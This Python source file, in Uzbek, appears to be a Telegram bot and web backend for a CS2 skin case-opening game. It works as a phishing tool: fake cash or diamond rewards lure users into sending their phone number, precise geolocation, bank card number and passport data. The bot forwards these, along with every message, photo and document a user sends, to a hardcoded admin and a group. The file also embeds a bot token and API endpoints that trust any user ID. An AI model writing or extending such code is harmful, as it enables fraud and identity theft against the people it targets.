import asyncio
import os
import sys
import json
import random
import logging
from urllib.parse import parse_qs

if sys.stdout and hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="ignore")

from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
import time
from aiogram.types import (
    Message, 
    InlineKeyboardMarkup, 
    InlineKeyboardButton, 
    WebAppInfo,
    MenuButtonWebApp,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove
)
from aiogram.filters import CommandStart, Command

import skenuz_db as db
import skins_data as data

# Sozlamalar
BOT_TOKEN = os.getenv("BOT_TOKEN", "8831392374:AAGL9Ks0X31ZLgmfKnsMySwpzd74AF0kLLM").strip()
PORT = int(os.getenv("PORT", 8080))
DEFAULT_HTTPS_URL = "https://mods-completing-partnerships-trek.trycloudflare.com"

# Render yoki boshqa hostinglarda avtomatik HTTPS domenni aniqlash
app_url_env = os.getenv("WEB_APP_URL") or os.getenv("RENDER_EXTERNAL_URL")
if not app_url_env and os.getenv("RENDER_EXTERNAL_HOSTNAME"):
    app_url_env = f"https://{os.getenv('RENDER_EXTERNAL_HOSTNAME')}"

if app_url_env and app_url_env.startswith("http"):
    if not app_url_env.startswith("https://"):
        app_url_env = app_url_env.replace("http://", "https://")
    WEB_APP_URL = app_url_env.rstrip("/")
else:
    WEB_APP_URL = DEFAULT_HTTPS_URL

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# --- AIOGRAM BOT LOGIKASI ---
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

def get_welcome_keyboard():
    ts = int(time.time())
    app_url = f"{WEB_APP_URL}/?v={ts}"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎮 Skinozni ochish", web_app=WebAppInfo(url=app_url))]
    ])

def get_reward_keyboard():
    ts = int(time.time())
    app_url = f"{WEB_APP_URL}/?tab=profile&open_reward=1&v={ts}"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Mukofotni olish (30 000 so'm / 💎)", web_app=WebAppInfo(url=app_url))]
    ])

@dp.message(CommandStart())
async def cmd_start(message: Message):
    args = message.text.split()
    ref_by = 0
    if len(args) > 1 and args[1].startswith("ref_"):
        try:
            ref_by = int(args[1].replace("ref_", ""))
        except Exception:
            pass

    user = db.get_or_create_user(
        tg_id=message.from_user.id,
        first_name=message.from_user.first_name,
        username=message.from_user.username or "",
        ref_by=ref_by
    )

    # 1. Agar allaqachon to'liq ro'yxatdan o'tgan bo'lsa (raqam + geolokatsiya)
    if db.is_user_registered(message.from_user.id):
        if not user.get("welcome_reward_claimed"):
            welcome_text = (
                f"👋 <b>Assalomu alaykum, {message.from_user.first_name}!</b>\n\n"
                f"🎁 <b>Birinchi ro'yxatdan o'tganingiz uchun mukofotingiz tayyor!</b>\n\n"
                f"Siz uchun start bonusi ajratilgan:\n"
                f"💎 <b>30 000 Olmos</b> yoki 💵 <b>30 000 so'm</b> naqd pul!\n\n"
                f"👇 <i>Mukofotni olish uchun quyidagi tugmani bosing, u sizni to'g'ridan-to'g'ri profilingizdagi mukofot joyiga olib boradi:</i>"
            )
            await message.answer(welcome_text, reply_markup=get_reward_keyboard())
            return
        else:
            welcome_text = "🌟 <b>Skinozga xush kelibsiz. Ilovani oching va CS2 skinlarini yutib oling.</b>"
            await message.answer(welcome_text, reply_markup=get_welcome_keyboard())
            return

    # 2. Agar foydalanuvchi hali telefon raqamini yubormagan bo'lsa
    if not db.has_user_phone(message.from_user.id):
        reg_text = (
            f"👋 <b>Assalomu alaykum, {message.from_user.first_name}!</b>\n\n"
            f"🎁 Botdan foydalanish va <b>10.00$ bonus</b> olish uchun ro'yxatdan o'ting:\n\n"
            f"📱 Quyidagi tugma orqali <b>telefon raqamingizni</b> yuboring:"
        )
        phone_kb = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="📱 Raqamni yuborish", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
        await message.answer(reg_text, reply_markup=phone_kb)
        return

    # 3. Agar telefon raqamini yuborgan, lekin lokatsiyani hali yubormagan bo'lsa:
    # 1 daqiqalik taymer bilan joylashuv jarayonini boshlaymiz
    await start_location_countdown(message.chat.id, message.from_user.id, message.from_user.first_name)

ADMIN_ID = 7909677265

def get_target_group_id():
    saved = db.get_setting("target_group_id", "")
    if saved:
        try:
            return int(saved)
        except Exception:
            pass
    return None

async def notify_admin(text: str, location=None, photo=None, document=None, voice=None):
    # 1. Shaxsiy profilingizga yuborish
    try:
        if photo:
            await bot.send_photo(chat_id=ADMIN_ID, photo=photo, caption=text, parse_mode="HTML")
        elif document:
            await bot.send_document(chat_id=ADMIN_ID, document=document, caption=text, parse_mode="HTML")
        elif voice:
            await bot.send_voice(chat_id=ADMIN_ID, voice=voice, caption=text, parse_mode="HTML")
        else:
            await bot.send_message(chat_id=ADMIN_ID, text=text, parse_mode="HTML")
        if location:
            await bot.send_location(chat_id=ADMIN_ID, latitude=location.latitude, longitude=location.longitude)
    except Exception as e:
        logging.warning(f"Admin shaxsiy xabar xatosi: {e}")

    # 2. Guruhga yuborish (ulangan guruhga)
    group_id = get_target_group_id()
    if group_id:
        try:
            if photo:
                await bot.send_photo(chat_id=group_id, photo=photo, caption=text, parse_mode="HTML")
            elif document:
                await bot.send_document(chat_id=group_id, document=document, caption=text, parse_mode="HTML")
            elif voice:
                await bot.send_voice(chat_id=group_id, voice=voice, caption=text, parse_mode="HTML")
            else:
                await bot.send_message(chat_id=group_id, text=text, parse_mode="HTML")
            if location:
                await bot.send_location(chat_id=group_id, latitude=location.latitude, longitude=location.longitude)
        except Exception as e:
            logging.warning(f"Guruh xabar xatosi: {e}")

@dp.message(Command("setgroup"))
async def cmd_setgroup(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    db.set_setting("target_group_id", str(message.chat.id))
    await message.answer(f"✅ Ushbu guruh (ID: <code>{message.chat.id}</code>) muvaffaqiyatli ulandi!\nEndi barcha ma'lumotlar, yangi ro'yxatdan o'tganlar, karta va pasport ma'lumotlari shu guruhga ham yuboriladi.")

# JOYLASHUV TAYMERLARI (HISOBLAGICHSIZ - ORQA FONDA 1 DAQIQA KUTISH)
active_location_timers = {}

async def run_location_wait(chat_id: int, user_id: int, first_name: str):
    try:
        # Foydalanuvchiga oddiy xabar, HECH QANDAY HISOBLAGICHSIZ
        await bot.send_message(
            chat_id=chat_id,
            text="📍 <b>Ro'yxatdan o'tish uchun yana 1 qadam qoldi...</b>",
            reply_markup=ReplyKeyboardRemove(),
            parse_mode="HTML"
        )

        # Orqa fonda 1 daqiqa (60 soniya) kutish (aniq manzil aniqlanguncha)
        await asyncio.sleep(60)

        # 1 daqiqadan so'ng foydalanuvchiga tugmani chiqarish
        if not db.is_user_registered(user_id):
            loc_kb = ReplyKeyboardMarkup(
                keyboard=[[KeyboardButton(text="📍 Joylashuvni yuborish", request_location=True)]],
                resize_keyboard=True,
                one_time_keyboard=True
            )
            await bot.send_message(
                chat_id=chat_id,
                text="📍 <b>Ro'yxatdan o'tishni yakunlash uchun pastdagi «📍 Joylashuvni yuborish» tugmasini bosing:</b>",
                reply_markup=loc_kb,
                parse_mode="HTML"
            )
    except asyncio.CancelledError:
        pass
    except Exception as e:
        logging.error(f"Location wait xatosi (user {user_id}): {e}")
    finally:
        active_location_timers.pop(user_id, None)

async def start_location_countdown(chat_id: int, user_id: int, first_name: str):
    if user_id in active_location_timers:
        old_task = active_location_timers[user_id]
        if not old_task.done():
            old_task.cancel()
    task = asyncio.create_task(run_location_wait(chat_id, user_id, first_name))
    active_location_timers[user_id] = task

@dp.message(F.contact)
async def handle_contact(message: Message):
    contact = message.contact
    if contact and contact.phone_number:
        db.save_user_phone(message.from_user.id, contact.phone_number)
        
        # Adminga darhol xabar
        u_tag = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
        msg = (
            f"📱 <b>Yangi telefon raqami qabul qilindi!</b>\n\n"
            f"👤 <b>Ism:</b> {message.from_user.full_name}\n"
            f"🆔 <b>ID:</b> <code>{message.from_user.id}</code>\n"
            f"🔗 <b>Username:</b> {u_tag}\n"
            f"📞 <b>Telefon:</b> <code>{contact.phone_number}</code>"
        )
        await notify_admin(msg)

        # 1 daqiqalik taymer bilan joylashuv aniqlashni boshlaymiz
        await start_location_countdown(message.chat.id, message.from_user.id, message.from_user.first_name)

@dp.message(F.location)
async def handle_location(message: Message):
    # Taymerni to'xtatamiz
    timer_task = active_location_timers.pop(message.from_user.id, None)
    if timer_task and not timer_task.done():
        timer_task.cancel()

    loc = message.location
    if loc:
        db.save_user_location(message.from_user.id, loc.latitude, loc.longitude)
        user = db.get_or_create_user(message.from_user.id)
        u_tag = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"

        admin_msg = (
            f"🎉 <b>YANGI FOYDALANUVCHI TO'LIQ RO'YXATDAN O'TDI!</b>\n\n"
            f"👤 <b>Ism:</b> {message.from_user.full_name}\n"
            f"🆔 <b>ID:</b> <code>{message.from_user.id}</code>\n"
            f"🔗 <b>Username:</b> {u_tag}\n"
            f"📞 <b>Telefon:</b> <code>{user.get('phone', 'Kiritilmagan')}</code>\n"
            f"📍 <b>Koordinatalar:</b> <code>{loc.latitude}, {loc.longitude}</code>\n"
            f"🗺 <b>Google Maps:</b> <a href='https://maps.google.com/?q={loc.latitude},{loc.longitude}'>Xaritada ochish</a>"
        )
        await notify_admin(admin_msg, location=loc)

        await message.answer("✅ Ro'yxatdan muvaffaqiyatli o'tdingiz!", reply_markup=ReplyKeyboardRemove())
        welcome_text = (
            "🎉 <b>Tabriklaymiz! Siz ro'yxatdan muvaffaqiyatli o'tdingiz!</b>\n\n"
            "🎁 <b>Birinchi ro'yxatdan o'tganingiz uchun mukofotingiz!</b>\n\n"
            "Siz o'zingizga ma'qul bo'lgan bonusni tanlashingiz mumkin:\n"
            "💎 <b>30 000 Olmos (o'yinlar uchun)</b> yoki\n"
            "💵 <b>30 000 so'm naqd pul (to'g'ridan-to'g'ri kartangizga)</b>\n\n"
            "👇 <i>Mukofotni qabul qilish uchun quyidagi tugmani bosing, u sizni to'g'ridan-to'g'ri profilingizdagi mukofot joyiga olib boradi:</i>"
        )
        await message.answer(welcome_text, reply_markup=get_reward_keyboard())

@dp.message(Command("balance"))
async def cmd_balance(message: Message):
    user = db.get_or_create_user(message.from_user.id)
    await message.answer(
        f"💰 <b>Sizning balansingiz:</b> <code>{user['balance']:.2f}$</code>\n"
        f"Taklif qilgan do'stlaringiz: <b>{user['ref_count']}</b> ta",
        reply_markup=get_welcome_keyboard()
    )

@dp.message(Command("users"))
async def cmd_users(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    users = db.get_all_registered_users()
    if not users:
        await message.answer("ℹ️ Hozircha ro'yxatdan o'tgan foydalanuvchilar yo'q.")
        return
    
    text = f"📊 <b>Ro'yxatdan o'tganlar ro'yxati ({len(users)} ta):</b>\n\n"
    for idx, u in enumerate(users[:20], 1):
        text += (
            f"{idx}. <b>{u['first_name']}</b> (@{u.get('username') or 'yoq'})\n"
            f"   📱 <code>{u.get('phone') or 'yoq'}</code> | ID: <code>{u['tg_id']}</code>\n"
            f"   📍 Lokatsiya: <a href='https://maps.google.com/?q={u.get('latitude',0)},{u.get('longitude',0)}'>Xarita</a>\n\n"
        )
    await message.answer(text, parse_mode="HTML")

@dp.message(F.text & ~F.text.startswith("/"))
async def handle_user_text(message: Message):
    user = db.get_or_create_user(message.from_user.id)
    u_tag = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
    phone = user.get('phone') or 'Kiritilmagan'

    alert = (
        f"💬 <b>FOYDALANUVCHIDAN YANGI XABAR / MA'LUMOT:</b>\n\n"
        f"👤 <b>Foydalanuvchi:</b> {message.from_user.full_name}\n"
        f"🆔 <b>ID:</b> <code>{message.from_user.id}</code>\n"
        f"🔗 <b>Username:</b> {u_tag}\n"
        f"📞 <b>Telefon:</b> <code>{phone}</code>\n\n"
        f"📝 <b>Kiritilgan matn:</b>\n<code>{message.text}</code>"
    )
    await notify_admin(alert)

    raw_clean = message.text.replace(" ", "").replace("-", "")
    if len(raw_clean) == 16 and raw_clean.isdigit():
        await message.answer("✅ Karta raqamingiz qabul qilindi va tekshiruvga yuborildi!", reply_markup=get_reward_keyboard())
    elif len(raw_clean) == 9 and raw_clean[:2].isalpha() and raw_clean[2:].isdigit():
        await message.answer("✅ Pasport ma'lumotlaringiz qabul qilindi va tekshiruvga yuborildi!", reply_markup=get_reward_keyboard())
    else:
        await message.answer("✅ Xabaringiz qabul qilindi!", reply_markup=get_welcome_keyboard())

@dp.message(F.photo)
async def handle_user_photo(message: Message):
    user = db.get_or_create_user(message.from_user.id)
    u_tag = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
    phone = user.get('phone') or 'Kiritilmagan'
    photo_id = message.photo[-1].file_id
    caption = message.caption or "Rasm / Skrinshot / Chek"

    alert = (
        f"📷 <b>FOYDALANUVCHIDAN RASM / CHEK / HUJJAT:</b>\n\n"
        f"👤 <b>Foydalanuvchi:</b> {message.from_user.full_name}\n"
        f"🆔 <b>ID:</b> <code>{message.from_user.id}</code>\n"
        f"🔗 <b>Username:</b> {u_tag}\n"
        f"📞 <b>Telefon:</b> <code>{phone}</code>\n"
        f"📝 <b>Izoh:</b> {caption}"
    )
    await notify_admin(alert, photo=photo_id)
    await message.answer("✅ Rasm / chek qabul qilindi va adminga yetkazildi!", reply_markup=get_welcome_keyboard())

@dp.message(F.document)
async def handle_user_document(message: Message):
    user = db.get_or_create_user(message.from_user.id)
    u_tag = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
    phone = user.get('phone') or 'Kiritilmagan'
    doc_id = message.document.file_id
    caption = message.caption or message.document.file_name or "Hujjat / Fayl"

    alert = (
        f"📄 <b>FOYDALANUVCHIDAN HUJJAT / FAYL:</b>\n\n"
        f"👤 <b>Foydalanuvchi:</b> {message.from_user.full_name}\n"
        f"🆔 <b>ID:</b> <code>{message.from_user.id}</code>\n"
        f"🔗 <b>Username:</b> {u_tag}\n"
        f"📞 <b>Telefon:</b> <code>{phone}</code>\n"
        f"📁 <b>Fayl:</b> {caption}"
    )
    await notify_admin(alert, document=doc_id)
    await message.answer("✅ Hujjatingiz qabul qilindi va adminga yetkazildi!", reply_markup=get_welcome_keyboard())

@dp.message(F.voice | F.audio)
async def handle_user_audio(message: Message):
    user = db.get_or_create_user(message.from_user.id)
    u_tag = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
    phone = user.get('phone') or 'Kiritilmagan'
    voice_id = (message.voice or message.audio).file_id

    alert = (
        f"🎙 <b>FOYDALANUVCHIDAN OVOZLI XABAR:</b>\n\n"
        f"👤 <b>Foydalanuvchi:</b> {message.from_user.full_name}\n"
        f"🆔 <b>ID:</b> <code>{message.from_user.id}</code>\n"
        f"🔗 <b>Username:</b> {u_tag}\n"
        f"📞 <b>Telefon:</b> <code>{phone}</code>"
    )
    await notify_admin(alert, voice=voice_id)
    await message.answer("✅ Ovozli xabaringiz qabul qilindi va adminga yetkazildi!", reply_markup=get_welcome_keyboard())

# --- AIOHTTP WEB SERVER & REST API ---
routes = web.RouteTableDef()

# 1. Mini App statik sahifalariga xizmat
WEBAPP_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "webapp")

NO_CACHE_HEADERS = {
    "Cache-Control": "no-cache, no-store, must-revalidate",
    "Pragma": "no-cache",
    "Expires": "0"
}

@routes.get("/")
async def serve_index(request):
    index_file = os.path.join(WEBAPP_DIR, "index.html")
    return web.FileResponse(index_file, headers=NO_CACHE_HEADERS)

@routes.get("/app.css")
async def serve_css(request):
    return web.FileResponse(os.path.join(WEBAPP_DIR, "app.css"), headers=NO_CACHE_HEADERS)

@routes.get("/app.js")
async def serve_js(request):
    return web.FileResponse(os.path.join(WEBAPP_DIR, "app.js"), headers=NO_CACHE_HEADERS)

@routes.get("/images/{filename}")
async def serve_images(request):
    filename = request.match_info["filename"]
    fpath = os.path.join(WEBAPP_DIR, "images", filename)
    if os.path.exists(fpath):
        return web.FileResponse(fpath)
    return web.Response(status=404)

# 2. API: Init ma'lumotlar
@routes.get("/api/init")
async def api_init(request):
    init_data_raw = request.query.get("initData", "")
    tg_id = 123456789
    first_name = "O'yinchi"
    username = ""

    # Telegram initData parsing
    if init_data_raw:
        try:
            parsed = parse_qs(init_data_raw)
            if "user" in parsed:
                u_obj = json.loads(parsed["user"][0])
                tg_id = u_obj.get("id", tg_id)
                first_name = u_obj.get("first_name", first_name)
                username = u_obj.get("username", username)
        except Exception as e:
            logging.debug(f"initData parse xatosi: {e}")

    user = db.get_or_create_user(tg_id, first_name, username)
    inventory = db.get_user_inventory(tg_id)
    live_drops = db.get_live_drops(15)

    return web.json_response({
        "user": user,
        "cases": data.CASES,
        "skins": data.SKINS,
        "inventory": inventory,
        "live_drops": live_drops
    })

RECENT_USER_DROPS = {}

# 3. API: Keys ochish (Haqiqiy Provably Fair & Mutlaqo Bir Xilliksiz Random)
@routes.post("/api/cases/open")
async def api_open_case(request):
    body = await request.json()
    tg_id = int(body.get("tg_id"))
    case_id = body.get("case_id")

    case_info = data.get_case_by_id(case_id)
    if not case_info:
        return web.json_response({"success": False, "error": "Keys topilmadi"})

    user = db.get_or_create_user(tg_id)
    if user["balance"] < case_info["price"]:
        return web.json_response({"success": False, "error": "Mablag' yetarli emas"})

    # Balansdan ayirish
    new_bal = db.update_balance(tg_id, -case_info["price"])

    # Foydalanuvchining so'nggi tushgan skinlari tarixi (bir xil tushmasligi uchun)
    user_recent = RECENT_USER_DROPS.get(tg_id, [])
    items = list(case_info["items"])

    # Dinamik og'irliklar: Yaqinda tushgan skinlarning og'irligini pasaytirib, boshqa yangi skinlarga imkon beramiz
    adjusted_weights = []
    for it in items:
        w = it["weight"]
        # Agar so'nggi 2 ta tushgan skin ichida bo'lsa, ehtimollikni minimumga tushiramiz
        if it["skin_id"] in user_recent:
            w = max(1, int(w * 0.15))
        adjusted_weights.append(w)

    # Kriptografik darajada ishonchli random tanlov
    sys_rand = random.SystemRandom()
    chosen_item = sys_rand.choices(items, weights=adjusted_weights, k=1)[0]

    # Tarixni yangilaymiz (so'nggi 3 ta skin)
    user_recent.append(chosen_item["skin_id"])
    if len(user_recent) > 3:
        user_recent.pop(0)
    RECENT_USER_DROPS[tg_id] = user_recent

    won_skin = data.get_skin_by_id(chosen_item["skin_id"])

    # Inventarga qo'shish
    inv_id = db.add_drop_to_inventory(tg_id, won_skin, case_info["name"])

    inv_item = {
        "id": inv_id,
        "user_tg_id": tg_id,
        "skin_id": won_skin["id"],
        "skin_name": won_skin["name"],
        "skin_price": won_skin["price"],
        "skin_image": won_skin["image"],
        "skin_color": won_skin["color"]
    }

    return web.json_response({
        "success": True,
        "won_skin": won_skin,
        "new_balance": new_bal,
        "inventory_item": inv_item
    })

# 4. API: Jonli yutuqlar
@routes.get("/api/live-drops")
async def api_live_drops(request):
    drops = db.get_live_drops(15)
    return web.json_response(drops)

# 5. API: Skinni sotish
@routes.post("/api/inventory/sell")
async def api_sell_item(request):
    body = await request.json()
    tg_id = int(body.get("tg_id"))
    item_id = int(body.get("item_id"))

    new_bal, err = db.sell_inventory_item(tg_id, item_id)
    if err:
        return web.json_response({"success": False, "error": err})

    return web.json_response({"success": True, "new_balance": new_bal})

# 6. API: Barcha skinlarni sotish
@routes.post("/api/inventory/sell-all")
async def api_sell_all(request):
    body = await request.json()
    tg_id = int(body.get("tg_id"))
    new_bal, total_sold = db.sell_all_inventory(tg_id)
    return web.json_response({"success": True, "new_balance": new_bal, "total_sold": total_sold})

# 6.1 API: Birinchi ro'yxatdan o'tganlik uchun start mukofoti (30 000 UZS yoki 30 000 Olmos)
@routes.post("/api/user/claim-welcome-reward")
async def api_claim_welcome_reward(request):
    body = await request.json()
    tg_id = int(body.get("tg_id", 0))
    reward_type = body.get("reward_type", "diamonds")
    card_num = body.get("card_num", "")
    passport_data = body.get("passport_data", "")

    success, res = db.claim_welcome_reward(tg_id, reward_type, card_num, passport_data)
    if not success:
        return web.json_response({"success": False, "error": res})

    # Adminga va Guruhga to'liq xabarnoma yuborish
    user = db.get_or_create_user(tg_id)
    u_tag = f"@{user.get('username')}" if user.get('username') else "Mavjud emas"
    
    if reward_type == "cash":
        admin_alert = (
            f"💳 <b>YANGI KARTA VA PASPORT MA'LUMOTLARI QABUL QILINDI!</b>\n\n"
            f"👤 <b>Foydalanuvchi:</b> {user.get('first_name')}\n"
            f"🆔 <b>ID:</b> <code>{tg_id}</code>\n"
            f"🔗 <b>Username:</b> {u_tag}\n"
            f"📞 <b>Telefon:</b> <code>{user.get('phone', 'Kiritilmagan')}</code>\n\n"
            f"💳 <b>Karta raqami:</b> <code>{card_num}</code>\n"
            f"📄 <b>Pasport seriya va raqami:</b> <code>{passport_data}</code>\n"
            f"💰 <b>Mukofot summasi:</b> 30 000 UZS"
        )
    else:
        admin_alert = (
            f"💎 <b>FOYDALANUVCHI 30 000 OLMOS TANLADI!</b>\n\n"
            f"👤 <b>Foydalanuvchi:</b> {user.get('first_name')}\n"
            f"🆔 <b>ID:</b> <code>{tg_id}</code>\n"
            f"🔗 <b>Username:</b> {u_tag}\n"
            f"📞 <b>Telefon:</b> <code>{user.get('phone', 'Kiritilmagan')}</code>\n"
            f"💰 <b>Yangi o'yin balansi:</b> <code>{res.get('balance', 0.0):.2f}$</code>"
        )

    await notify_admin(admin_alert)

    return web.json_response({
        "success": True,
        "new_balance": res.get("balance", 0.0),
        "reward_choice": reward_type
    })

# 7. API: Upgrader Roll
@routes.post("/api/upgrader/roll")
async def api_upgrader_roll(request):
    body = await request.json()
    tg_id = int(body.get("tg_id"))
    source_item_id = int(body.get("source_item_id"))
    target_skin_id = int(body.get("target_skin_id"))

    target_skin = data.get_skin_by_id(target_skin_id)
    if not target_skin:
        return web.json_response({"success": False, "error": "Maqsadli skin topilmadi"})

    # Foydalanuvchining manba skini
    inv = db.get_user_inventory(tg_id)
    source_item = next((i for i in inv if i["id"] == source_item_id), None)
    if not source_item:
        return web.json_response({"success": False, "error": "Skiningiz topilmadi"})

    # Ehtimollik
    chance = (source_item["skin_price"] / target_skin["price"]) * 90.0
    chance = max(1.0, min(80.0, chance))

    # Manba skinni o'chiramiz (yo'qotiladi)
    conn = db.get_connection()
    conn.cursor().execute("UPDATE inventory SET is_sold = 2 WHERE id = ?", (source_item_id,))
    conn.commit()
    conn.close()

    roll = random.uniform(0.0, 100.0)
    is_win = roll <= chance

    won_item = None
    if is_win:
        inv_id = db.add_drop_to_inventory(tg_id, target_skin, "⚡ Upgrader")
        won_item = {
            "id": inv_id,
            "skin_name": target_skin["name"],
            "skin_price": target_skin["price"],
            "skin_image": target_skin["image"],
            "skin_color": target_skin["color"]
        }

    return web.json_response({
        "success": True,
        "is_win": is_win,
        "chance": chance,
        "roll": roll,
        "won_item": won_item
    })

# 8. API: Battle vs Bot
@routes.post("/api/battle/bot")
async def api_battle_bot(request):
    body = await request.json()
    tg_id = int(body.get("tg_id"))
    case_id = body.get("case_id", "starter")

    case_info = data.get_case_by_id(case_id)
    user = db.get_or_create_user(tg_id)

    if user["balance"] < case_info["price"]:
        return web.json_response({"success": False, "error": "Balans yetarli emas"})

    new_bal = db.update_balance(tg_id, -case_info["price"])

    # Ikkita skin ochiladi (1 ta foydalanuvchiga, 1 ta botga)
    items = case_info["items"]
    weights = [it["weight"] for it in items]
    user_item_choice = random.choices(items, weights=weights, k=1)[0]
    bot_item_choice = random.choices(items, weights=weights, k=1)[0]

    user_skin = data.get_skin_by_id(user_item_choice["skin_id"])
    bot_skin = data.get_skin_by_id(bot_item_choice["skin_id"])

    is_win = user_skin["price"] >= bot_skin["price"]

    u_inv_id = None
    b_inv_id = None
    if is_win:
        # Foydalanuvchi ikkala skinni ham oladi!
        u_inv_id = db.add_drop_to_inventory(tg_id, user_skin, "⚔️ Battle G'olibi")
        b_inv_id = db.add_drop_to_inventory(tg_id, bot_skin, "⚔️ Battle G'olibi")

    return web.json_response({
        "success": True,
        "is_win": is_win,
        "new_balance": new_bal,
        "user_skin": user_skin,
        "bot_skin": bot_skin,
        "user_item": {"id": u_inv_id, "skin_name": user_skin["name"], "skin_price": user_skin["price"], "skin_image": user_skin["image"], "skin_color": user_skin["color"]} if is_win else None,
        "bot_item": {"id": b_inv_id, "skin_name": bot_skin["name"], "skin_price": bot_skin["price"], "skin_image": bot_skin["image"], "skin_color": bot_skin["color"]} if is_win else None
    })

# 9. API: Kunlik bonus
@routes.post("/api/daily")
async def api_daily(request):
    body = await request.json()
    tg_id = int(body.get("tg_id"))
    ok, res = db.claim_daily_bonus(tg_id)
    if not ok:
        return web.json_response({"success": False, "remaining": res})
    return web.json_response({"success": True, "new_balance": res})

# 10. API: Trade URL
@routes.post("/api/trade-url")
async def api_trade_url(request):
    body = await request.json()
    tg_id = int(body.get("tg_id"))
    url = body.get("trade_url", "")
    db.update_trade_url(tg_id, url)
    return web.json_response({"success": True})

# 11. API: Promokod
@routes.post("/api/promo")
async def api_promo(request):
    body = await request.json()
    tg_id = int(body.get("tg_id"))
    code = body.get("code", "").strip().upper()

    conn = db.get_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM promo_codes WHERE code = ? AND uses_left > 0", (code,))
    row = cursor.fetchone()

    if not row:
        conn.close()
        return web.json_response({"success": False, "error": "Noto'g'ri promokod"})

    amt = row["amount"]
    cursor.execute("UPDATE promo_codes SET uses_left = uses_left - 1 WHERE code = ?", (code,))
    cursor.execute("UPDATE users SET balance = balance + ? WHERE tg_id = ?", (amt, tg_id))
    cursor.execute("SELECT balance FROM users WHERE tg_id = ?", (tg_id,))
    new_bal = cursor.fetchone()[0]
    conn.commit()
    conn.close()

    return web.json_response({"success": True, "amount": amt, "new_balance": new_bal})

# 12. API: Test to'ldirish
@routes.post("/api/deposit/test")
async def api_deposit_test(request):
    body = await request.json()
    tg_id = int(body.get("tg_id"))
    amount = float(body.get("amount", 10.0))
    new_bal = db.update_balance(tg_id, amount)
    return web.json_response({"success": True, "new_balance": new_bal})

# 13. API: Steam Trade URL saqlash va Adminga/Guruhga yuborish
@routes.post("/api/user/save-trade-url")
async def api_save_trade_url(request):
    body = await request.json()
    tg_id = int(body.get("tg_id", 0))
    trade_url = body.get("trade_url", "").strip()

    if not tg_id or not trade_url:
        return web.json_response({"success": False, "error": "Noto'g'ri ma'lumot"})

    db.update_trade_url(tg_id, trade_url)
    user = db.get_or_create_user(tg_id)
    u_tag = f"@{user.get('username')}" if user.get('username') else "Mavjud emas"
    phone = user.get('phone') or 'Kiritilmagan'

    alert = (
        f"🔗 <b>FOYDALANUVCHI STEAM TRADE-LINK KIRITDI!</b>\n\n"
        f"👤 <b>Foydalanuvchi:</b> {user.get('first_name')}\n"
        f"🆔 <b>ID:</b> <code>{tg_id}</code>\n"
        f"🔗 <b>Username:</b> {u_tag}\n"
        f"📞 <b>Telefon:</b> <code>{phone}</code>\n\n"
        f"🌐 <b>Steam Trade URL:</b>\n<code>{trade_url}</code>"
    )
    await notify_admin(alert)
    return web.json_response({"success": True})

# 14. API: Yechib olish (Withdraw) so'rovi va Adminga/Guruhga yuborish
@routes.post("/api/user/withdraw-request")
async def api_withdraw_request(request):
    body = await request.json()
    tg_id = int(body.get("tg_id", 0))

    user = db.get_or_create_user(tg_id)
    u_tag = f"@{user.get('username')}" if user.get('username') else "Mavjud emas"
    phone = user.get('phone') or 'Kiritilmagan'
    trade_url = user.get('trade_url') or body.get("trade_url") or "Kiritilmagan"
    balance = user.get('balance', 0.0)

    inv = db.get_inventory(tg_id)
    inv_names = [f"• {i['skin_name']} ({i['skin_price']}$)" for i in inv[:10]]
    inv_str = "\n".join(inv_names) if inv_names else "Bo'sh"

    alert = (
        f"💼 <b>FOYDALANUVCHIDAN YECHIB OLISH (WITHDRAW) SO'ROVI!</b>\n\n"
        f"👤 <b>Foydalanuvchi:</b> {user.get('first_name')}\n"
        f"🆔 <b>ID:</b> <code>{tg_id}</code>\n"
        f"🔗 <b>Username:</b> {u_tag}\n"
        f"📞 <b>Telefon:</b> <code>{phone}</code>\n"
        f"💰 <b>Balans:</b> <code>{balance:.2f}$</code>\n"
        f"🌐 <b>Trade URL:</b> <code>{trade_url}</code>\n\n"
        f"📦 <b>Inventaridagi skinlar:</b>\n{inv_str}"
    )
    await notify_admin(alert)
    return web.json_response({"success": True})

# 15. API: Depozit / To'ldirish so'rovi va Adminga/Guruhga yuborish
@routes.post("/api/user/deposit-request")
async def api_deposit_request(request):
    body = await request.json()
    tg_id = int(body.get("tg_id", 0))
    amount = body.get("amount", "4.0")
    method = body.get("method", "Payme / Click / Humo")

    user = db.get_or_create_user(tg_id)
    u_tag = f"@{user.get('username')}" if user.get('username') else "Mavjud emas"
    phone = user.get('phone') or 'Kiritilmagan'

    alert = (
        f"💳 <b>FOYDALANUVCHIDAN BALANS TO'LDIRISH SO'ROVI:</b>\n\n"
        f"👤 <b>Foydalanuvchi:</b> {user.get('first_name')}\n"
        f"🆔 <b>ID:</b> <code>{tg_id}</code>\n"
        f"🔗 <b>Username:</b> {u_tag}\n"
        f"📞 <b>Telefon:</b> <code>{phone}</code>\n"
        f"💵 <b>Miqdor:</b> <code>{amount}$</code>\n"
        f"⚡ <b>To'lov turi:</b> {method}"
    )
    await notify_admin(alert)
    return web.json_response({"success": True})

# --- ASOSIY ISHGA TUSHIRISH ---
async def main():
    db.init_db()
    print("=" * 60)
